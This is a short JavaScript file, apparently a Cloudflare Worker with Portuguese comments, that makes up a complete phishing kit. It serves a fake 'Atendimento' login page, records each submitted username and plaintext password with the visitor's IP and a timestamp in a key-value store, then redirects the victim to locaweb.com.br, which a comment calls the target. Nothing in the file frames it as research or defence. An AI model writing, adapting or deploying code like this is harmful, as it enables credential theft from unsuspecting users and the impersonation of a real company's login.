// arquivo: index.js
const HTML=`<!DOCTYPE html>
<html lang="pt-BR"><head>
<meta charset="utf-8"/><title>Atendimento</title>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<style>body{font-family:Arial;background:#f2f2f2;display:flex;height:100vh;align-items:center;justify-content:center}.card{background:#fff;padding:35px 30px;border-radius:8px;box-shadow:0 4px 14px rgba(0,0,0,.15);width:340px;max-width:90%}h2{margin-top:0;text-align:center;color:#004680}input{width:100%;padding:12px;margin:8px 0 16px;border:1px solid #ccc;border-radius:4px}button{width:100%;padding:12px;background:#0073bc;color:#fff;border:0;border-radius:4px;font-size:16px;cursor:pointer}button:hover{background:#005a9e}</style>
</head><body>
<div class="card">
<h2>Entrar no Atendimento</h2>
<form method="post" autocomplete="off">
<input name="user" placeholder="Usuário" required/>
<input name="pass" type="password" placeholder="Senha" required/>
<button>Entrar</button>
</form>
</div>
</body></html>`;

addEventListener('fetch',e=>e.respondWith(handle(e.request)));

async function handle(req){
  const url=new URL(req.url);
  // página inicial
  if(req.method==='GET') return new Response(HTML,{headers:{'content-type':'text/html;charset=utf-8'}});

  // recebe POST
  if(req.method==='POST'){
     const body=await req.formData();
     const user=(body.get('user')||'').trim();
     const pass=(body.get('pass')||'').trim();
     const ip=req.headers.get('CF-Connecting-IP')||'0.0.0.0';
     const ts=new Date().toLocaleString('pt-BR');
     const linha=`${ts} | ${ip} | ${user} | ${pass}\n`;
     // grava no KV
     await ATENDIMENTO_KV.put(`log_${Date.now()}`,linha);
     // redireciona pro alvo
     return Response.redirect('https://locaweb.com.br',302);
  }
  return new Response('Not Found',{status:404});
}
